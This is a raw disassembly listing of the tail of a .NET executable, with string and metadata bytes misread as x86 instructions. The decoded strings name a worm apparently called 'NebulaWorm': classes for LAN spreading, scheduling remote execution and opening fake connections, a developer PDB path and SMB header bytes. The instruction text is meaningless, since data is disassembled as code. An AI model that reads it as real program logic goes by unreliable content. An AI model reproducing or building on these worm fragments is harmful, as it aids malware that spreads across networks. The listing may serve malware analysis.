  40b352:	6d                   	insl   (%dx),%es:(%edi)
  40b353:	65 77 6f             	gs ja  0x40b3c5
  40b356:	72 6b                	jb     0x40b3c3
  40b358:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40b35b:	37                   	aaa
  40b35c:	2e 32 2b             	xor    %cs:(%ebx),%ch
  40b35f:	01 00                	add    %eax,(%eax)
  40b361:	26 4e                	es dec %esi
  40b363:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b367:	61                   	popa
  40b368:	57                   	push   %edi
  40b369:	6f                   	outsl  %ds:(%esi),(%dx)
  40b36a:	72 6d                	jb     0x40b3d9
  40b36c:	2e 4c                	cs dec %esp
  40b36e:	61                   	popa
  40b36f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b370:	53                   	push   %ebx
  40b371:	70 72                	jo     0x40b3e5
  40b373:	65 61                	gs popa
  40b375:	64 2b 3c 53          	sub    %fs:(%ebx,%edx,2),%edi
  40b379:	70 72                	jo     0x40b3ed
  40b37b:	65 61                	gs popa
  40b37d:	64 41                	fs inc %ecx
  40b37f:	73 79                	jae    0x40b3fa
  40b381:	6e                   	outsb  %ds:(%esi),(%dx)
  40b382:	63 3e                	arpl   %edi,(%esi)
  40b384:	64 5f                	fs pop %edi
  40b386:	5f                   	pop    %edi
  40b387:	38 00                	cmp    %al,(%eax)
  40b389:	00 40 01             	add    %al,0x1(%eax)
  40b38c:	00 3b                	add    %bh,(%ebx)
  40b38e:	4e                   	dec    %esi
  40b38f:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b393:	61                   	popa
  40b394:	57                   	push   %edi
  40b395:	6f                   	outsl  %ds:(%esi),(%dx)
  40b396:	72 6d                	jb     0x40b405
  40b398:	2e 4c                	cs dec %esp
  40b39a:	61                   	popa
  40b39b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b39c:	53                   	push   %ebx
  40b39d:	70 72                	jo     0x40b411
  40b39f:	65 61                	gs popa
  40b3a1:	64 2b 3c 54          	sub    %fs:(%esp,%edx,2),%edi
  40b3a5:	72 79                	jb     0x40b420
  40b3a7:	53                   	push   %ebx
  40b3a8:	63 68 65             	arpl   %ebp,0x65(%eax)
  40b3ab:	64 75 6c             	fs jne 0x40b41a
  40b3ae:	65 52                	gs push %edx
  40b3b0:	65 6d                	gs insl (%dx),%es:(%edi)
  40b3b2:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3b3:	74 65                	je     0x40b41a
  40b3b5:	45                   	inc    %ebp
  40b3b6:	78 65                	js     0x40b41d
  40b3b8:	63 75 74             	arpl   %esi,0x74(%ebp)
  40b3bb:	69 6f 6e 41 73 79 6e 	imul   $0x6e797341,0x6e(%edi),%ebp
  40b3c2:	63 3e                	arpl   %edi,(%esi)
  40b3c4:	64 5f                	fs pop %edi
  40b3c6:	5f                   	pop    %edi
  40b3c7:	31 36                	xor    %esi,(%esi)
  40b3c9:	00 00                	add    %al,(%eax)
  40b3cb:	22 01                	and    (%ecx),%al
  40b3cd:	00 1d 4e 65 62 75    	add    %bl,0x7562654e
  40b3d3:	6c                   	insb   (%dx),%es:(%edi)
  40b3d4:	61                   	popa
  40b3d5:	57                   	push   %edi
  40b3d6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3d7:	72 6d                	jb     0x40b446
  40b3d9:	2e 50                	cs push %eax
  40b3db:	72 6f                	jb     0x40b44c
  40b3dd:	67 72 61             	addr16 jb 0x40b441
  40b3e0:	6d                   	insl   (%dx),%es:(%edi)
  40b3e1:	2b 3c 4d 61 69 6e 3e 	sub    0x3e6e6961(,%ecx,2),%edi
  40b3e8:	64 5f                	fs pop %edi
  40b3ea:	5f                   	pop    %edi
  40b3eb:	31 00                	xor    %eax,(%eax)
  40b3ed:	00 04 01             	add    %al,(%ecx,%eax,1)
  40b3f0:	00 00                	add    %al,(%eax)
  40b3f2:	00 34 01             	add    %dh,(%ecx,%eax,1)
  40b3f5:	00 2f                	add    %ch,(%edi)
  40b3f7:	4e                   	dec    %esi
  40b3f8:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b3fc:	61                   	popa
  40b3fd:	57                   	push   %edi
  40b3fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3ff:	72 6d                	jb     0x40b46e
  40b401:	2e 53                	cs push %ebx
  40b403:	6c                   	insb   (%dx),%es:(%edi)
  40b404:	6f                   	outsl  %ds:(%esi),(%dx)
  40b405:	77 57                	ja     0x40b45e
  40b407:	69 2b 3c 4f 70 65    	imul   $0x65704f3c,(%ebx),%ebp
  40b40d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b40e:	46                   	inc    %esi
  40b40f:	61                   	popa
  40b410:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  40b414:	6e                   	outsb  %ds:(%esi),(%dx)
  40b415:	6e                   	outsb  %ds:(%esi),(%dx)
  40b416:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40b41b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b41c:	41                   	inc    %ecx
  40b41d:	73 79                	jae    0x40b498
  40b41f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b420:	63 3e                	arpl   %edi,(%esi)
  40b422:	64 5f                	fs pop %edi
  40b424:	5f                   	pop    %edi
  40b425:	35 00 00 2f 01       	xor    $0x12f0000,%eax
  40b42a:	00 2a                	add    %ch,(%edx)
  40b42c:	4e                   	dec    %esi
  40b42d:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b431:	61                   	popa
  40b432:	57                   	push   %edi
  40b433:	6f                   	outsl  %ds:(%esi),(%dx)
  40b434:	72 6d                	jb     0x40b4a3
  40b436:	2e 53                	cs push %ebx
  40b438:	70 72                	jo     0x40b4ac
  40b43a:	65 61                	gs popa
  40b43c:	64 69 6e 67 2b 3c 53 	imul   $0x70533c2b,%fs:0x67(%esi),%ebp
  40b443:	70 
  40b444:	72 65                	jb     0x40b4ab
  40b446:	61                   	popa
  40b447:	64 4f                	fs dec %edi
  40b449:	6e                   	outsb  %ds:(%esi),(%dx)
  40b44a:	63 65 41             	arpl   %esp,0x41(%ebp)
  40b44d:	73 79                	jae    0x40b4c8
  40b44f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b450:	63 3e                	arpl   %edi,(%esi)
  40b452:	64 5f                	fs pop %edi
  40b454:	5f                   	pop    %edi
  40b455:	36 00 00             	add    %al,%ss:(%eax)
  40b458:	43                   	inc    %ebx
  40b459:	01 00                	add    %eax,(%eax)
  40b45b:	3e 4e                	ds dec %esi
  40b45d:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b461:	61                   	popa
  40b462:	57                   	push   %edi
  40b463:	6f                   	outsl  %ds:(%esi),(%dx)
  40b464:	72 6d                	jb     0x40b4d3
  40b466:	2e 4c                	cs dec %esp
  40b468:	61                   	popa
  40b469:	6e                   	outsb  %ds:(%esi),(%dx)
  40b46a:	53                   	push   %ebx
  40b46b:	70 72                	jo     0x40b4df
  40b46d:	65 61                	gs popa
  40b46f:	64 2b 3c 3e          	sub    %fs:(%esi,%edi,1),%edi
  40b473:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40b476:	44                   	inc    %esp
  40b477:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40b47e:	6c                   	insb   (%dx),%es:(%edi)
  40b47f:	61                   	popa
  40b480:	73 73                	jae    0x40b4f5
  40b482:	38 5f 31             	cmp    %bl,0x31(%edi)
  40b485:	2b 3c 3c             	sub    (%esp,%edi,1),%edi
  40b488:	53                   	push   %ebx
  40b489:	70 72                	jo     0x40b4fd
  40b48b:	65 61                	gs popa
  40b48d:	64 41                	fs inc %ecx
  40b48f:	73 79                	jae    0x40b50a
  40b491:	6e                   	outsb  %ds:(%esi),(%dx)
  40b492:	63 3e                	arpl   %edi,(%esi)
  40b494:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40b497:	31 3e                	xor    %edi,(%esi)
  40b499:	64 00 00             	add    %al,%fs:(%eax)
  40b49c:	2b 01                	sub    (%ecx),%eax
  40b49e:	00 26                	add    %ah,(%esi)
  40b4a0:	4e                   	dec    %esi
  40b4a1:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b4a5:	61                   	popa
  40b4a6:	57                   	push   %edi
  40b4a7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4a8:	72 6d                	jb     0x40b517
  40b4aa:	2e 53                	cs push %ebx
  40b4ac:	6c                   	insb   (%dx),%es:(%edi)
  40b4ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4ae:	77 57                	ja     0x40b507
  40b4b0:	69 2b 3c 3e 63 2b    	imul   $0x2b633e3c,(%ebx),%ebp
  40b4b6:	3c 3c                	cmp    $0x3c,%al
  40b4b8:	53                   	push   %ebx
  40b4b9:	74 61                	je     0x40b51c
  40b4bb:	72 74                	jb     0x40b531
  40b4bd:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40b4c1:	33 5f 30             	xor    0x30(%edi),%ebx
  40b4c4:	3e 64 00 00          	ds add %al,%fs:(%eax)
  40b4c8:	37                   	aaa
  40b4c9:	01 00                	add    %eax,(%eax)
  40b4cb:	32 4e 65             	xor    0x65(%esi),%cl
  40b4ce:	62 75 6c             	bound  %esi,0x6c(%ebp)
  40b4d1:	61                   	popa
  40b4d2:	57                   	push   %edi
  40b4d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4d4:	72 6d                	jb     0x40b543
  40b4d6:	2e 53                	cs push %ebx
  40b4d8:	70 72                	jo     0x40b54c
  40b4da:	65 61                	gs popa
  40b4dc:	64 69 6e 67 2b 3c 3e 	imul   $0x633e3c2b,%fs:0x67(%esi),%ebp
  40b4e3:	63 
  40b4e4:	2b 3c 3c             	sub    (%esp,%edi,1),%edi
  40b4e7:	53                   	push   %ebx
  40b4e8:	74 61                	je     0x40b54b
  40b4ea:	72 74                	jb     0x40b560
  40b4ec:	53                   	push   %ebx
  40b4ed:	70 72                	jo     0x40b561
  40b4ef:	65 61                	gs popa
  40b4f1:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  40b4f8:	5f 
  40b4f9:	34 5f                	xor    $0x5f,%al
  40b4fb:	30 3e                	xor    %bh,(%esi)
  40b4fd:	64 00 00             	add    %al,%fs:(%eax)
  40b500:	00 00                	add    %al,(%eax)
  40b502:	00 00                	add    %al,(%eax)
  40b504:	3f                   	aas
  40b505:	96                   	xchg   %eax,%esi
  40b506:	0e                   	push   %cs
  40b507:	dc 00                	faddl  (%eax)
  40b509:	00 00                	add    %al,(%eax)
  40b50b:	00 02                	add    %al,(%edx)
  40b50d:	00 00                	add    %al,(%eax)
  40b50f:	00 60 00             	add    %ah,0x0(%eax)
  40b512:	00 00                	add    %al,(%eax)
  40b514:	38 b5 00 00 38 97    	cmp    %dh,-0x68c80000(%ebp)
	...
  40b526:	00 00                	add    %al,(%eax)
  40b528:	10 00                	adc    %al,(%eax)
	...
  40b536:	00 00                	add    %al,(%eax)
  40b538:	52                   	push   %edx
  40b539:	53                   	push   %ebx
  40b53a:	44                   	inc    %esp
  40b53b:	53                   	push   %ebx
  40b53c:	41                   	inc    %ecx
  40b53d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b53e:	42                   	inc    %edx
  40b53f:	31 c3                	xor    %eax,%ebx
  40b541:	51                   	push   %ecx
  40b542:	61                   	popa
  40b543:	46                   	inc    %esi
  40b544:	b6 e4                	mov    $0xe4,%dh
  40b546:	70 7c                	jo     0x40b5c4
  40b548:	20 73 87             	and    %dh,-0x79(%ebx)
  40b54b:	15 01 00 00 00       	adc    $0x1,%eax
  40b550:	43                   	inc    %ebx
  40b551:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  40b555:	65 72 73             	gs jb  0x40b5cb
  40b558:	5c                   	pop    %esp
  40b559:	49                   	dec    %ecx
  40b55a:	7a 6f                	jp     0x40b5cb
  40b55c:	6c                   	insb   (%dx),%es:(%edi)
  40b55d:	79 5c                	jns    0x40b5bb
  40b55f:	44                   	inc    %esp
  40b560:	65 73 6b             	gs jae 0x40b5ce
  40b563:	74 6f                	je     0x40b5d4
  40b565:	70 5c                	jo     0x40b5c3
  40b567:	4e                   	dec    %esi
  40b568:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b56c:	61                   	popa
  40b56d:	57                   	push   %edi
  40b56e:	6f                   	outsl  %ds:(%esi),(%dx)
  40b56f:	72 6d                	jb     0x40b5de
  40b571:	5c                   	pop    %esp
  40b572:	4e                   	dec    %esi
  40b573:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b577:	61                   	popa
  40b578:	57                   	push   %edi
  40b579:	6f                   	outsl  %ds:(%esi),(%dx)
  40b57a:	72 6d                	jb     0x40b5e9
  40b57c:	5c                   	pop    %esp
  40b57d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b57e:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  40b581:	52                   	push   %edx
  40b582:	65 6c                	gs insb (%dx),%es:(%edi)
  40b584:	65 61                	gs popa
  40b586:	73 65                	jae    0x40b5ed
  40b588:	5c                   	pop    %esp
  40b589:	4e                   	dec    %esi
  40b58a:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b58e:	61                   	popa
  40b58f:	57                   	push   %edi
  40b590:	6f                   	outsl  %ds:(%esi),(%dx)
  40b591:	72 6d                	jb     0x40b600
  40b593:	2e 70 64             	jo,pn  0x40b5fa
  40b596:	62 00                	bound  %eax,(%eax)
  40b598:	c0 b5 00 00 00 00 00 	shlb   $0x0,0x0(%ebp)
  40b59f:	00 00                	add    %al,(%eax)
  40b5a1:	00 00                	add    %al,(%eax)
  40b5a3:	00 da                	add    %bl,%dl
  40b5a5:	b5 00                	mov    $0x0,%ch
  40b5a7:	00 00                	add    %al,(%eax)
  40b5a9:	20 00                	and    %al,(%eax)
	...
  40b5bf:	00 cc                	add    %cl,%ah
  40b5c1:	b5 00                	mov    $0x0,%ch
	...
  40b5cb:	00 00                	add    %al,(%eax)
  40b5cd:	00 5f 43             	add    %bl,0x43(%edi)
  40b5d0:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5d1:	72 45                	jb     0x40b618
  40b5d3:	78 65                	js     0x40b63a
  40b5d5:	4d                   	dec    %ebp
  40b5d6:	61                   	popa
  40b5d7:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40b5de:	72 65                	jb     0x40b645
  40b5e0:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40b5e4:	6c                   	insb   (%dx),%es:(%edi)
  40b5e5:	00 00                	add    %al,(%eax)
  40b5e7:	00 00                	add    %al,(%eax)
  40b5e9:	00 ff                	add    %bh,%bh
  40b5eb:	25 00 20 40 00       	and    $0x402000,%eax
  40b5f0:	31 c0                	xor    %eax,%eax
  40b5f2:	c3                   	ret
	...
  40b5fb:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b5fc:	fe                   	(bad)
  40b5fd:	53                   	push   %ebx
  40b5fe:	4d                   	dec    %ebp
  40b5ff:	42                   	inc    %edx
  40b600:	40                   	inc    %eax
  40b601:	00 00                	add    %al,(%eax)
  40b603:	00 00                	add    %al,(%eax)
  40b605:	00 01                	add    %al,(%ecx)
	...
  40b60f:	00 00                	add    %al,(%eax)
  40b611:	00 24 00             	add    %ah,(%eax,%eax,1)
  40b614:	00 00                	add    %al,(%eax)
  40b616:	02 00                	add    (%eax),%al
  40b618:	0c 00                	or     $0x0,%al
  40b61a:	01 00                	add    %eax,(%eax)
  40b61c:	00 00                	add    %al,(%eax)
  40b61e:	00 00                	add    %al,(%eax)
  40b620:	00 00                	add    %al,(%eax)
  40b622:	7f 00                	jg     0x40b624
  40b624:	00 00                	add    %al,(%eax)
  40b626:	00 00                	add    %al,(%eax)
  40b628:	00 00                	add    %al,(%eax)
  40b62a:	10 00                	adc    %al,(%eax)
  40b62c:	00 00                	add    %al,(%eax)
  40b62e:	02 02                	add    (%edx),%al
  40b630:	10 02                	adc    %al,(%edx)
  40b632:	22 02                	and    (%edx),%al
  40b634:	24 02                	and    $0x2,%al
  40b636:	00 03                	add    %al,(%ebx)
  40b638:	02 03                	add    (%ebx),%al
  40b63a:	10 03                	adc    %al,(%ebx)
  40b63c:	11 03                	adc    %eax,(%ebx)
  40b63e:	00 00                	add    %al,(%eax)
  40b640:	12 03                	adc    (%ebx),%al
  40b642:	00 01                	add    %al,(%ecx)
	...
  40b64c:	00 00                	add    %al,(%eax)
  40b64e:	78 00                	js     0x40b650
  40b650:	00 00                	add    %al,(%eax)
  40b652:	01 00                	add    %eax,(%eax)
  40b654:	26 00 00             	add    %al,%es:(%eax)
  40b657:	00 00                	add    %al,(%eax)
  40b659:	00 01                	add    %al,(%ecx)
  40b65b:	00 20                	add    %ah,(%eax)
  40b65d:	00 00                	add    %al,(%eax)
  40b65f:	00 00                	add    %al,(%eax)
  40b661:	00 03                	add    %al,(%ebx)
  40b663:	00 00                	add    %al,(%eax)
  40b665:	00 01                	add    %al,(%ecx)
  40b667:	00 00                	add    %al,(%eax)
  40b669:	00 02                	add    %al,(%edx)
  40b66b:	00 00                	add    %al,(%eax)
  40b66d:	00 03                	add    %al,(%ebx)
	...
